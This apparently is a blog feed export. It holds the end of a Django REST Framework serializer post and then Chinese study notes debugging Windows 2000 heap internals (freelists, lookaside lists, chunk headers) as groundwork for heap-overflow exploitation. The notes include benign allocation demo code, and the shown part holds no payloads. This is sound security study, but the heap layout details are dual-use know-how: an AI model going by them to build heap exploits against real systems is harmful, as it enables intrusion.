<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(self, validated_data)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        self.child.create(attrs) <span class="keyword">for</span> attrs <span class="keyword">in</span> validated_data</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>

<h2 id="视图层-views-py"><a href="#视图层-views-py" class="headerlink" title="视图层 views.py"></a>视图层 <code>views.py</code></h2><p>在视图层将 单局部改和群局部改整合，思路如下：</p>
<ol>
<li>单局部改：对 <code>v3/books/pk/</code>   <code>pk</code>通过路由传参，修改数据选择传参，通过数据包json传递</li>
<li>群局部修改：<code>v3/books/</code> 修改数据通过数据包传递，设置成列表格式  <code>[{pk:1,name:123},{pk:3,price:7},{pk:7,publish:2}]</code></li>
<li>先将单改，群改的数据都格式化成 <code>pks=[要需要的对象主键标识]</code>， <code>request_data=[每个要修改的对象对应的修改数据]</code></li>
<li><code>pks</code>与<code>request_data</code>数据筛选，将<code>pks</code>中的没有对应数据的<code>pk</code>与数据已删除的<code>pk</code>移除，<code>request_data</code>对应索引位上的数据也移除，将合理的<code>pks</code>转换为<code>objs</code></li>
</ol>
<details>

<summary> <b><i>Source Code</i></b> </summary>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

</details>

<h1 id="ListSerializer使用要点小结"><a href="#ListSerializer使用要点小结" class="headerlink" title="ListSerializer使用要点小结"></a><code>ListSerializer</code>使用要点小结</h1><p><code>views.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ser_obj = ModelSerializer(instance=model_obj,data=model_data,partial=<span class="literal">True</span>,many=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><code>serializer.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 实现群改功能，反序列化情况下的create、update就不再调用ModelSerializer的</span></span><br><span class="line"><span class="comment"># 而是调用 ModelSerializer.Meta.list_serializer_class 指向的 ListSerializer 类的create、update</span></span><br><span class="line"><span class="comment"># ListSerializer默认只实现了群增的create，要实现群改，必须重写update</span></span><br><span class="line"></span><br><span class="line">　　<span class="comment">#自定义序列化类，重写update方法</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyListSerializer</span><span class="params">(ListSerializer)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">update</span><span class="params">(self, instance, validated_data)</span>:</span></span><br><span class="line">        <span class="comment"># print(instance)  # 要更新的对象们: [obj1, obj2, ...]</span></span><br><span class="line">        <span class="comment"># print(validated_data)  # 更新的对象对应的数据们: [&#123;&#125;, &#123;&#125;, ...]</span></span><br><span class="line">        <span class="comment"># print(self.child)  # 服务的模型序列化类 - V2BookModelSerializer</span></span><br><span class="line">        <span class="keyword">for</span> index, obj <span class="keyword">in</span> enumerate(instance):</span><br><span class="line">            self.child.update(obj, validated_data[index])</span><br><span class="line">        <span class="keyword">return</span> instance</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">MyModelSerializer</span><span class="params">(ModelSerializer)</span>:</span></span><br><span class="line">        <span class="class"><span class="keyword">class</span> <span class="title">Meta</span>:</span></span><br><span class="line">            list_serializer_class = MyListSerializer</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将两者类建立关联，在MyListSerializer中就可以用self.child拿到# MyModelSerializer，进而使用MyModelSerializer中封装好的方法</span></span><br><span class="line">    cls.Meta.list_serializer_class.child = cls</span><br></pre></td></tr></table></figure>

<h1 id="源码补充分析"><a href="#源码补充分析" class="headerlink" title="源码补充分析"></a>源码补充分析</h1><p>分析一下修改为什么要用<code>instance</code>传参。</p>
<p>修改之后数据使用<code>save()</code>保存，从视图的<code>save()</code>点击进去查看源码，下面是<code>BaseSerializer</code>类中的<code>save</code>，而该<code>save</code>未被实现。</p>
<p>因此接着查看<code>save</code>方法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span><span class="params">(self, **kwargs)</span>:</span></span><br><span class="line">    <span class="comment"># ...</span></span><br><span class="line"></span><br><span class="line">    validated_data = [</span><br><span class="line">        dict(list(attrs.items()) + list(kwargs.items()))</span><br><span class="line">        <span class="keyword">for</span> attrs <span class="keyword">in</span> self.validated_data</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        self.instance = self.update(self.instance, validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`update()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        self.instance = self.create(validated_data)</span><br><span class="line">        <span class="keyword">assert</span> self.instance <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>, (</span><br><span class="line">            <span class="string">'`create()` did not return an object instance.'</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> self.instance</span><br></pre></td></tr></table></figure>

<p><code>instance</code>存在就走<code>update</code>方法，修改数据(<code>PUT</code>/<code>PATCH</code>)时都应传入<code>instance</code>，所以单改群改都需要传入<code>data</code>（反序列化用）和<code>instance</code>（序列化用）参数。</p>
]]></content>
      <categories>
        <category>Tech</category>
      </categories>
      <tags>
        <tag>Tech</tag>
        <tag>Backend</tag>
        <tag>Django</tag>
        <tag>Django REST FrameWork</tag>
        <tag>DRF</tag>
        <tag>Learning Notes</tag>
        <tag>Dev</tag>
      </tags>
  </entry>
  <entry>
    <title>堆溢出学习笔记(Win2K) (上)</title>
    <url>/tech/heap-overflow-learning-notes-1/</url>
    <content><![CDATA[<ul>
<li>Title(EN): <em><strong>Heap Overflow Learning Notes(Win2K) #1</strong></em></li>
<li>Author: dog2</li>
</ul>
<hr>
<p>最近在啃《0day安全：软件漏洞分析技术》（第二版）一书，打算入门二进制漏洞分析。书中第五章“堆溢出利用”较前几章难度有所增大，原因在于堆结构较之前学习的栈更复杂，第五章中的例子涵盖了堆的分布、堆块分配和释放、堆溢出利用，利用堆溢出进行攻击的例子是通过修改P.E.B（进程环境块）中指向RtlEnterCriticalSection()函数的指针，该函数在程序退出时被调用。在调试完所有例子以后，对堆的内部细节和堆溢出利用终于有了些许的理解。</p>
<p>第六章中也涉及到堆溢出利用，不过此处是利用Windows异常处理机制S.E.H（异常处理结构体）来实现攻击的，看完后打算调试一遍，发现几天前通过调试建立的对内存中堆分布和操作的理解都忘得差不多了，这时候终于体会到 _<strong>学习过程中根据自己的体会做一些重要笔记并且据此定期复习的重要性</strong>_，因此有了本篇。</p>
<p>希望这是个好的开头，提醒自己谨记对于复杂的重难点，要以日志的形式形成学习笔记，以供日后温故知新。</p>
<p>关于堆以及P.E.B、S.E.H等机制的介绍，0day书中已经非常系统详尽，本文不再赘述，这里仅给出我的实验调试过程，记录其中踩的坑以及一些体会，因此以过程截图为主，相关简述为辅。第六章中堆的例子作者并没有给出相关代码及过程细节，这里也会附上。由于初学，文中难免存在错误，欢迎指正。</p>
<a id="more"></a>

<h2 id="0x00-准备工作"><a href="#0x00-准备工作" class="headerlink" title="0x00 准备工作"></a>0x00 准备工作</h2><blockquote><p>调试堆与调试栈不同，不能直接用调试器OllyDBG、WinDBG来加载程序，否则堆管理函数会检测到当前进程处于调试状态，而使用调试态堆管理策略。</p>
<p>调试态对管理策略和常态堆管理策略有很大差异。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P153</cite></footer></blockquote>

<p>因此需要防止程序运行后进入调试态，按照书中所述以如下方式设置：</p>
<ul>
<li>设置OllyDBG为默认调试器：OllyDBG -&gt; Options菜单 -&gt; Just-in-time debugging</li>
</ul>
<img data-src="/tech/heap-overflow-learning-notes-1/0_1.png" class="" title="图0.1">

<ul>
<li>设置OllyDBG 不捕获INT3中断：OllyDBG -&gt; Options菜单 -&gt; Debugging options</li>
</ul>
<img data-src="/tech/heap-overflow-learning-notes-1/0_2.png" class="" title="图0.2">

<h2 id="0x01-初识堆"><a href="#0x01-初识堆" class="headerlink" title="0x01 初识堆"></a>0x01 初识堆</h2><hr>
<blockquote><p>在Windows中，占用态的堆块被使用它的程序索引，而堆表只索引所有空闲态的堆块。其中最重要的堆表有两种：空闲双向链表Freelist（以下简称空表）和 快速单向链表Lookaside（以下简称快表）。</p>
<p>堆的操作中可以分为堆块分配、堆块释放和堆块合并（Coalesce）三种。其中，“分配”和“释放”是在程序_（即在用户代码中）_提交申请和执行的，而堆块合并则是有对管理系统自己完成的。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P147 & P149</cite></footer></blockquote>

<p>下面观察空表的分配、释放及合并，快表中没有合并操作，因此观察它的分配及释放。</p>
<h3 id="1-空闲双向链表Freelist"><a href="#1-空闲双向链表Freelist" class="headerlink" title="1. 空闲双向链表Freelist"></a>1. 空闲双向链表Freelist</h3><p>示例代码如下</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P152 -> heap_debug.c</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 6.2 in book "Vulnerability Exploit and Analysis Technique"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_debug.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2007.04.04</span></span><br><span class="line"><span class="comment">description	: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">3</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">5</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">6</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">19</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//free block and prevent coaleses</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); <span class="comment">//free to freelist[2] </span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//free to freelist[4]</span></span><br><span class="line">	</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4); <span class="comment">//coalese h3,h4,h5,link the large block to freelist[8]</span></span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>运行程序，由于INT3中断产生异常，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_1.png" class="" title="图1.1.1">

<p>选择Cancel以加载默认调试器OllyDBG。</p>
<h4 id="1-寻找代码HeapCreate-所创建的堆"><a href="#1-寻找代码HeapCreate-所创建的堆" class="headerlink" title="(1) 寻找代码HeapCreate()所创建的堆"></a>(1) 寻找代码HeapCreate()所创建的堆</h4><p>进入OllyDBG后，单击下图中的M按钮，以查看程序当前的内存映射状态：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_2.png" class="" title="图1.1.2">

<p>与上图对应的0day书中图5.2.5指出了内存映射Memory Map中进程堆、malloc使用堆、实验中HeapCreate()创建的堆的起始地址，作者没有说明后2个是如何判断的，我的理解如下：</p>
<ul>
<li>malloc使用堆：这里我还无法判断，因为上图的内存映射情况跟书中的图有较大不同。</li>
<li>实验中HeapCreate()创建的堆：可用根据大小为0x1000以及Type为Priv来筛选，0x0012D000虽然也满足，但是地址很小，在线程及进程堆附近，应该不是用户所创建的堆。因此可用筛选出0x00360000为程序代码创建的堆。</li>
</ul>
<p>上面讨论的是只根据观察Memory map来识别各种类型的堆，其实本例中要判断HeapCreate()创建的堆可直接根据当前汇编代码运行到INT3时EAX的值来判断，即为0x00360000，因为在INT3代码之前刚刚调用了HeapCreate()函数，并且返回了创建的堆的其实地址，该值正存储在EAX中，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_3.png" class="" title="图1.1.3">

<h4 id="2-观察堆表信息"><a href="#2-观察堆表信息" class="headerlink" title="(2) 观察堆表信息"></a>(2) 观察堆表信息</h4><blockquote><p>空闲堆块的块首中包含一对重要指针，这对指针用于将空闲堆块组织成双向链表。按照堆块的大小不同，空表总共被分为128条。</p>
<p>堆区一开始的堆表区中有一个128项的指针数组，被称做空表索引（Freelist array）。该数组的每一项包括两个指针，用于标识一个空表。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P147</cite></footer></blockquote>

<p>在内存查看窗口中，Ctrl+G来到地址0x00360000处，观察内存，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_4.png" class="" title="图1.1.4">

<p>按照书中介绍，从0x00360000开始，堆表中包含的信息依次为</p>
<ul>
<li>段表索引 Segment List</li>
<li>虚表索引 Virtual Allocation list</li>
<li>空表使用标识 freelist usage bitmap</li>
<li>空表索引区</li>
</ul>
<p>这里只关心从偏移0x178处(距离堆起始地址0x00360000的偏移，后文省略)开始的空表索引区，这个区域存放着Freelist数组Freelist[0]~Freelist[127]，每个数组元素大小为8Byte，包含2个4Byte指针，前向指针flink（指向所在链表中下一个堆块）和后向指针blink（指向所在链表中前一个堆块）。</p>
<p>参考书中图5.1.2，空表索引是用来索引不同大小的堆块数据链的。堆块用来存储数据，其最小单位为8 Byte，空闲堆块按照其大小被区分开来，相同大小的空闲堆块被串接起来，形成一个包含若干个同样大小的堆块堆块链。如Freelist[1]指向的是一条由若干个大小都为 1 x 8 Byte的堆块串接起来的堆块数据链，依此类推，Freelist[127]指向的是一条由若干个大小都为 127 x 8 Byte的堆块串接起来的堆块数据链，其中前向指针flink指向的是堆块数据链中的第一个堆块，后向指针blink指向的是最后一个堆块。Freelist[0]较为特殊，它链入所有 大于等于1024 Byte且小于512 KB的堆块，这些堆块按照各自的大小在Freelist[0]中升序串接。</p>
<img data-src="/tech/heap-overflow-learning-notes-1/0day_5_1_2.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P148 -&gt; 图5.1.2">

<p>值得一提的是，参考书中图5.2.8和5.2.9，每个完整的堆块的前8 Byte是块首，存储着该块大小、状态等相关信息。</p>
<img data-src="/tech/heap-overflow-learning-notes-1/0day_5_2_8.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P156 -&gt; 图5.2.8">

<img data-src="/tech/heap-overflow-learning-notes-1/0day_5_2_9.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P157 -&gt; 图5.2.9">

<p>块首之后数据的作用根据该堆块是否空闲有所不同：</p>
<ul>
<li>空闲态堆块中，紧接着块首的8 Byte包含该空闲块的前向指针和后向指针，余下的字节就是实际数据了。</li>
<li>占用态堆块中，块首之后便是实际数据的数据。</li>
</ul>
<p>因此，1个包含8 Byte数据的堆块，在内存中占用的实际空间为16 Byte。当该堆块为空闲态时，8-15 Byte为前向指针和后向指针；当该堆块为占用态时，后8 Byte为实际数据。</p>
<p>我们发现图1.1.4中的空表索引区中除了Freelist[0]中的2个指针都指向0x688，之后每个元素中的前向指针和后向指针都指向该元素的起始地址，这是因为初始状态下的堆是没有的固定大小的空闲块的，除了一个非常大、连续的初始空闲块，即尾块，它正是Freelist[0]的2个指针所指的堆块。</p>
<p>我们来到0x680观察尾块，如下图</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_5.png" class="" title="图1.1.5">

<p>从上图可以看出，尾块的大小为0x130 x 8 Byte，前后向指针都指向freelist[0]。</p>
<p>这里值得一提的是块首信息中的Self Size的单位是8 Byte，也就是说该Self Size值为1的最小堆数据块占用的内存为 1 x 8 Byte，这是堆块数据的最小占用内存。</p>
<p>注意，尾块块首位于0x680，而非Freelist[0]中指针指向的0x688，因为<strong>空表中的前向指针和后向指针指向的都是堆块中实际数据的内存地址，而非块首的地址。</strong></p>
<h4 id="3-观察堆块的分配"><a href="#3-观察堆块的分配" class="headerlink" title="(3) 观察堆块的分配"></a>(3) 观察堆块的分配</h4><p>继续跟进代码，来观察堆块的分配与释放，但随即遇到一个坑：不管 Debugging options中怎么设置，代码执行到0x0040101D处的INT3之前，继续F8执行INT3，会进入内核代码直到终止，不会继续执行INT3之后的代码。在看雪论坛里看到大家也遇到了这种情况，也没有太好的解决办法。问题肯定出在汇编代码int3，因此我的解决办法是手动将int3改变为nop，执行空指令，这样就可以继续执行后面的代码了，但是也有不方便的地方，每次重启程序执行到该处都得手动修改此处。</p>
<p>连续几次F8代码执行到0x0040102B处，即完成h1堆内存分配之后，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_6.png" class="" title="图1.1.6">

<p>从上图中可以观察到，h1的堆内存地址是之前的空闲尾块的起始地址0x688，那原来的尾块何去何从？这时可以再观察一下空表索引区，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_7.png" class="" title="图1.1.7">

<p>从上图可以看到，Freelist[0]所指向的空闲尾块的起始地址变为0x698。再到地址0x680进行观察，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_8.png" class="" title="图1.1.8">

<p>可以看到，尾块变小到 0x12E x 8 Byte了，缩小了(0x130 - 0x12E) x 8 Byte = 16 Byte，这16 Byte即为h1所用，虽然在C代码中h1申请大小仅为3 Byte，但是据前所述，堆块数据的最小占用内存为 8 Byte，因此包括块首的h1还是占用了16 Byte的内存空间。由于h1仅申请了3 Byte，因此0x688的前4 Byte被置为0，而后4 Byte不做改变也不会被使用，所以其值仍为之前的尾块的后向指针的值。</p>
<p>随后的h2-h6分配过程类似，不再赘述，下面两图给出h6分配完毕后的空表索引区及对数据区的状态:</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_9.png" class="" title="图1.1.9">

<img data-src="/tech/heap-overflow-learning-notes-1/1_1_10.png" class="" title="图1.1.10">

<h4 id="4-观察堆块的释放"><a href="#4-观察堆块的释放" class="headerlink" title="(4) 观察堆块的释放"></a>(4) 观察堆块的释放</h4><p>接着观察堆块的释放，C代码中首先释放的是3个不相邻的堆块h1 h3 h5，由于它们不连续，因此不会发生合并。</p>
<p>将汇编代码执行到h5释放完毕，h6开始释放之前，观察空表索引区及堆数据区的状态：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_11.png" class="" title="图1.1.11">

<img data-src="/tech/heap-overflow-learning-notes-1/1_1_12.png" class="" title="图1.1.12">

<p>由于h1和h3的Self Size都为2且不相邻，当它们被释放时会先后与Freelist[2]串联构成双向链表，具体的链接方式为</p>
<ul>
<li>flink: FreeList[2] -&gt; h1 -&gt; h3 -&gt; FreeList[2]</li>
<li>blink: FreeList[2] -&gt; h3 -&gt; h1 -&gt; FreeList[2]</li>
</ul>
<p>释放后的h5被单独串联到Freelist[4]。</p>
<p>可以观察到在分配及释放前后，h1 h3 h5的块首中从左至右第6 Byte的数据由0x01变为0x00，该字节数据为堆块标识，值0x01表示该块处于Busy状态。处于Busy状态的空闲堆块不会被合并，而0x00状态的空闲堆块在合适的时候会被系统自动合并。</p>
<h4 id="5-观察堆块的合并"><a href="#5-观察堆块的合并" class="headerlink" title="(5) 观察堆块的合并"></a>(5) 观察堆块的合并</h4><p>继续执行释放h4的代码，当h4被释放后，观察空表索引区及堆数据区：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_1_13.png" class="" title="图1.1.13">

<img data-src="/tech/heap-overflow-learning-notes-1/1_1_14.png" class="" title="图1.1.14">

<p>h4被释放后，系统并不会把它与Freelist[4]串联，因为系统检测到h4 前与h3 后与h4相邻，会将它们合并，合并后新空闲块的大小为(2+2+4) x 8 Byte = 8 x 8 Byte，因此新块的Self Size为8。</p>
<p>同时观察空表索引区，由于h3被“拿走”，与Freelist[2]串联的只剩下了h1，原先与Freelist[4]串联的h5也被“拿走”，因此Freelist[4]中的指针再次指向了它自身，而合并得到的Self Size为8的新块与Freelist[8]进行了串接。 </p>
<h3 id="2-快速单向链表Lookaside"><a href="#2-快速单向链表Lookaside" class="headerlink" title="2. 快速单向链表Lookaside"></a>2. 快速单向链表Lookaside</h3><blockquote><p>快表是Windows用来加速堆块分配而采用的一种堆表。这里之所以把它叫做“快表”是因为这类单向链表中从来不会发生堆块合并（其中的空闲块块首被设置为占用态，用来防止堆块合并）。</p>
<p>快表也有128条，组织结构与空表类似，只是其中的堆块按照单链表组织。快表总是被初始化为空，而且每条快表最多只有4个节点，故很快就会被填满。</p>
<footer><strong>王清</strong><cite>《0day安全：软件漏洞分析技术》(第二版) -> P148-149</cite></footer></blockquote>

<p>快表结构如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/0day_5_1_3.png" class="" title="《0day安全：软件漏洞分析技术》(第二版) -&gt; P148 -&gt; 图5.1.3">

<p>示例代码如下：</p>
<figure class="highlight c"><figcaption><span>《0day安全：软件漏洞分析技术》(第二版) -> P161 -> heap_lookaside.c</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">      To be the apostrophe which changed "Impossible" into "I'm possible"!</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">POC code of chapter 5 in book "Lookaside Using"</span></span><br><span class="line"><span class="comment"> </span></span><br><span class="line"><span class="comment">file name	: heap_lookaside.c</span></span><br><span class="line"><span class="comment">author		: failwest  </span></span><br><span class="line"><span class="comment">date		: 2010.09.04</span></span><br><span class="line"><span class="comment">description	: demo show of how heap works</span></span><br><span class="line"><span class="comment">Noticed		:	1 only run on windows 2000</span></span><br><span class="line"><span class="comment">				2 complied with VC 6.0</span></span><br><span class="line"><span class="comment">				3 build into release version</span></span><br><span class="line"><span class="comment">				4 only used for run time debugging</span></span><br><span class="line"><span class="comment">version		: 1.0</span></span><br><span class="line"><span class="comment">E-mail		: failwest@gmail.com</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">	Only for educational purposes    enjoy the fun from exploiting :)</span></span><br><span class="line"><span class="comment">******************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	__asm <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译环境如下：</p>
<ul>
<li>操作系统：运行于Vmware虚拟机，版本Win 2K SP4 5.00.2195 EN</li>
<li>编译器：Visual C++ 6.0</li>
<li>编译选项：默认选项</li>
<li>build版本：release版</li>
</ul>
<p>本例中创建堆与上例中创建堆时的不同之处在于HeapCreate函数的使用，该函数细节详见<span class="exturl" data-url="aHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vemgtY24vbGlicmFyeS9hYTM2NjU5OQ==">MSDN<i class="fa fa-external-link-alt"></i></span>，该函数的第3个参数dwMaximumSize指定了该堆所能占用的最大空间，若dwMaximumSize=0，则将会创建一个按所需空间大小动态自增长的堆。</p>
<p>0day书中没有指出是否在调用HeapCreate时，将dwMaximumSize设置为0时系统就会自动启用快表，而置为非零时系统默认不使用快表，根据我的理解应该是这样的。</p>
<p><strong>在实验调试中，我发现0day书中5.2.7 “快表的使用”一节中有较为明显的错误，而后连锁反应式地在本节中引发了一连串错误。一开始还不敢确定，后来经过反复调试并阅读，基本确定错误属实而非环境不同造成的结果差异，下文将详述之。</strong></p>
<h4 id="1-观察堆表信息"><a href="#1-观察堆表信息" class="headerlink" title="(1) 观察堆表信息"></a>(1) 观察堆表信息</h4><p>0x178处存储的尾块指针不再指向0x688，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_2_1.png" class="" title="图1.2.1">

<blockquote>
<p>这里插播一个在学习过程中发现的OllyDBG使用小Tips，之前没看过OllyDBG的使用文档，一些最基本的操作都是从0day书中学习到的，因此已经熟悉OllyDBG使用的同学可忽略这条Tips。</p>
<p>观察上图中0x178处指针指向的尾块地址0x00361E90，若我们想要跳转到该地址去查看尾块，可以按照0day书中的方法在上图的内存查看窗口中按下Ctrl+G，然后键入361E90（默认16进制），就能够转到该地址查看内存。</p>
<p>此外，还可以用鼠标右键单击内存0x178处的值0x90，选择”Follow DWORD in Dump”，即可跳转到内存0x00361E90处。还可以通过单击+或-以来回切换前面的或后面的内存窗口查看，以实现0x178和0x1E90处内存的快速来回切换查看。</p>
</blockquote>
<p>0x688处已经被快表所霸占，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_2_2.png" class="" title="图1.2.2">

<blockquote>
<p>与上图对应的0day书中图5.2.17标注的Lookaside[0]位于0x6b8处而非0x688处，书中的标注有误。</p>
</blockquote>
<h4 id="2-观察堆块的分配"><a href="#2-观察堆块的分配" class="headerlink" title="(2) 观察堆块的分配"></a>(2) 观察堆块的分配</h4><p>接着，我们来观察堆块分配操作，观察h1申请后的内存，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_2_3.png" class="" title="图1.2.3">

<p>此时0x178处的尾块指针指向0x1EA0，说明跟上节中讨论的空表内存申请一样，申请过程也是Freelist[0]所指向的尾块为h1腾出了空间，结果表现为尾块缩小 2 x 8 Byte，它的起始部分“向后移动”了。</p>
<p>接着执行代码，完成h1至h4的分配，观察此时内存数据，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_2_4.png" class="" title="图1.2.4">

<h4 id="3-观察堆块的释放"><a href="#3-观察堆块的释放" class="headerlink" title="(3) 观察堆块的释放"></a>(3) 观察堆块的释放</h4><p>再观察h1至h4释放后的内存数据，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_2_5.png" class="" title="图1.2.5">

<p>可以看到，与空表中不同的是，在释放后各块块首中从左至右第6 Byte的数据并未改变，仍为0x01即Busy状态，该标识可以保证即使该堆块现在已变为空闲堆块也不会被系统自动合并。</p>
<p>其中，被释放后的h2中多出了一个指针，关于其用途，待观察0x688处的快表即可明白，如下图：</p>
<img data-src="/tech/heap-overflow-learning-notes-1/1_2_6.png" class="" title="图1.2.6">

<p>从上图可以看出，被释放后的各块被链入快表中，形成了3条单向链表：</p>
<ul>
<li>Lookaside[2] -&gt; h2 -&gt; h1</li>
<li>Lookaside[3] -&gt; h3</li>
<li>Lookaside[4] -&gt; h4</li>
</ul>
<blockquote>
